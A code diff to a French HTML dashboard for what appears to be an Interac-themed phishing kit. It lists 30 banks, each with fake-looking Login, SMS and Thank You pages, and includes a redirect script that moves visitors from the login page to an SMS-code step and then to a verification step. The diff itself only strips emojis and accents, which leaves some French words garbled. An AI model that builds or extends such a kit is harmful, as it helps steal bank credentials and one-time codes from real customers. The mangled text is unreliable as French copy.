@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>INTERAC — Tableau de bord</title>
+<title>INTERAC  Tableau de bord</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;background:#0b0d14;min-height:100vh;color:#fff}
@@ -53,22 +53,22 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;ba
 
 <div class="top">
   <div class="top-left">
-    <h1>🏦 INTERAC — Toutes les banques</h1>
-    <p>Serveur local · Testez le flux complet pour chaque banque</p>
+    <h1> INTERAC  Toutes les banques</h1>
+    <p>Serveur local  Testez le flux complet pour chaque banque</p>
   </div>
   <div class="interac-badge">
-    <a href="index.html" target="_blank">🔗 Page INTERAC principale</a>
+    <a href="index.html" target="_blank"> Page INTERAC principale</a>
   </div>
 </div>
 
 <div class="stats">
   <div class="stat"><div class="stat-val">30</div><div class="stat-lbl">Banques</div></div>
   <div class="stat"><div class="stat-val">3</div><div class="stat-lbl">Pages / banque</div></div>
-  <div class="stat"><div class="stat-val" id="filtered">30</div><div class="stat-lbl">Affichées</div></div>
+  <div class="stat"><div class="stat-val" id="filtered">30</div><div class="stat-lbl">Affiches</div></div>
 </div>
 
 <div class="search-wrap">
-  <input type="text" id="search" placeholder="🔍  Chercher une banque..." oninput="filterBanks()">
+  <input type="text" id="search" placeholder="  Chercher une banque..." oninput="filterBanks()">
 </div>
 
 <div class="grid" id="grid"></div>
@@ -116,9 +116,9 @@ function renderBanks(list) {
         <div class="bank-name">${b.name}</div>
         <div class="bank-key">${b.key}</div>
         <div class="btns">
-          <a class="btn btn-login" href="${b.key}.html" target="_blank">🏦 Login</a>
-          <a class="btn btn-sms"   href="${b.key}_sms.html" target="_blank">📱 SMS</a>
-          <a class="btn btn-ty"    href="${b.key}_thankyou.html" target="_blank">✅ Thank You</a>
+          <a class="btn btn-login" href="${b.key}.html" target="_blank"> Login</a>
+          <a class="btn btn-sms"   href="${b.key}_sms.html" target="_blank"> SMS</a>
+          <a class="btn btn-ty"    href="${b.key}_thankyou.html" target="_blank"> Thank You</a>
         </div>
       </div>
     </div>`).join('');
@@ -157,7 +157,7 @@ document.addEventListener("DOMContentLoaded", function() {
                         if (current.indexOf("_sms.html") !== -1) {
                             window.location.href = current.replace("_sms.html", "_step3.html");
                         } else if (current.indexOf("_step3.html") !== -1) {
-                            alert("Vérification terminée !");
+                            alert("Vrification termine !");
                         } else if (current !== "index.html" && current !== "") {
                             window.location.href = current.replace(".html", "_sms.html");
                         }
